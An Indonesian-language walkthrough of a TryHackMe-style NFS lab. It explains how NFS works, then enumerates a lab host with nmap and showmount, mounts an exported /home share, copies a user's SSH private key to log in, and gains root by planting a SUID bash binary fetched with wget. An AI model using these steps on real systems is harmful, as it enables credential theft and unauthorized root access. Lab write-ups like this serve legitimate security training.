# Understanding NFS

NFS atau Network File System yang mana memungkinkan system untuk sharing direktori dan file with others melalui network. Dengan menggunakan NFS, user dan program dapat mengakses file pada remote system hampir seperti menggunakan local files. Hal ini dilakukan dengan cara 'mounting' semua file/dir, atau beberapa porsi file system saja di server. Filesystem yang di mount dapat diakses oleh client dengan privilege apapun yang diatur dalam file.

### How NFS Works

Pertama, client akan meminta untuk memasang direktori dari remote host pada direktori lokal dengan cara yang sama seperti client dapat memasang perangkat fisik. Layanan mount kemudian akan bertindak untuk terhubung ke daemon mount yang relevan menggunakan RPC. Server selanjutnya akan mengecek jika user punya permission untuk mounting direktori apapun yang di request. selanjutnya nanti akan memberikan file handle yang mana secara unik mengidentifikasi setiap file dan direktori yang ada di server.

Jika seseorang ingin mengakses file menggunakan NFS, pemanggilan RPC atau RPC call akan diletakkan di NFSD (NFS daemon) di server. Call ini mengambil parameter seperti:

1. The file handle
2. The name of the file to be accessed
3. The user's, user ID
4. The user's group ID

parameter-parameter tersebut digunakan dalam menentukan hak akses ke file tertentu, seperti read atau write file. NFS dapat digunakan untuk transfer file antar OS.

# Enumerating NFS

lakukan enumerating menggunakan nmap

```shell
nmap -p- -A -oN enumer 10.10.158.157
```

hasilnya

```shell
...
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 (RSA)
|   256 6d:63:d6:b8:0a:67:fd:86:f1:22:30:2b:2d:27:1e:ff (ECDSA)
|_  256 bd:08:97:79:63:0f:80:7c:7f:e8:50:dc:59:cf:39:5e (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100021  1,3,4      39975/tcp6  nlockmgr
|   100021  1,3,4      40473/udp   nlockmgr
|   100021  1,3,4      46593/tcp   nlockmgr
|   100021  1,3,4      48792/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
46593/tcp open  nlockmgr 1-4 (RPC #100021)
51191/tcp open  mountd   1-3 (RPC #100005)
51685/tcp open  mountd   1-3 (RPC #100005)
53283/tcp open  mountd   1-3 (RPC #100005)
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%), Linux 3.5 (93%)
...
```

selain itu, kita dapat melihat dir yang dishare di NFS dengan cara 

```shell
/usr/sbin/showmount -e <IP target>
```

hasilnya adalah `/home`. Selanjutnya kita mounting NFS ke local dengan cara 

```shell
sudo mount -t nfs <IP target>:/home /tmp/mount/ -nolock
```

- `-t nfs` : specify device dan service yang akan di mount.
- `-nolock` : specifies not to use NLM locking.

setelahnya akan ada dir baru di `/tmp/mount/`, yaitu `/tmp/mount/cappucino`. kita dapat pindah ke sana dengan `cd`, lalu cek isinya dengan `ls -la`. ternyata tidak ada file menarik selain folder `.ssh`. maka kita bisa ambil private key miliki user `cappucino` ini dengan `cp /tmp/mount/cappucino/.ssh/id_rsa ~/Downloads/id_rsa`, lalu gunakan private key tersebut untuk login ke ssh.

```shell
ssh -i ~/Downloads/id_rsa cappucino@<IP target> -p 22
```

# Exploiting NFS

selanjutnya kita akan exploit NFS dengan metode priv_esc. Namun secara default, pada share NFS, pengaturan Root Squashing adalah enabled, dan hal ini mencegah siapa pun yang terhubung ke NFS punya root access ke volume NFS. Remote root user diberi pengguna '**nfsnobody**' saat terhubung, yang memiliki permission paling sedikit. Tentu hal itu tidak seperti yang kita inginkan. Namun, jika ini dimatikan, hal ini dapat memungkinkan pembuatan file bit SUID, memungkinkan remote root access ke sistem yang terhubung.

SUID merupakan permission yang mana memungkinkan user manapun run file dengan permission yang sama seperti owner file. Metodenya adalah kita download file bash executable dari [sini](https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash), atau dapat menggunakan `wget` melalui terminal

```shell
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
```

```script
Mapped Pathway by TryHackMe
    NFS Access ->
    |_Gain Low Privilege Shell ->
    |__Upload Bash Executable to the NFS share ->
    |___Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->
    |____Login through SSH ->
    |_____Execute SUID Bit Bash Executable ->
    |______ROOT ACCESS
```

setelah file bash exec telah didownload, kita pindahkan ke `/tmp/mount/cappucino`, lalu ubah owner menjadi root, dan juga ubah permission ke SUID dan executable dengan cara

```shell
sudo chown root bash

sudo chmod +sx bash
```

setelah itu kita beralih ke ssh, jika belum login, login ke ssh dengan id_rsa sebelumnya. Jika sudah login, maka kita dapat langsung execute file bash dengan cara `./bash -p`. Jika berhasil maka tampilan terminal akan berubah menjadi `bash-4.4#`. kita dapat langsung berpindah ke root dir dan mengambil flag yang diperlukan

```shell
cd /root
cat root.txt
```
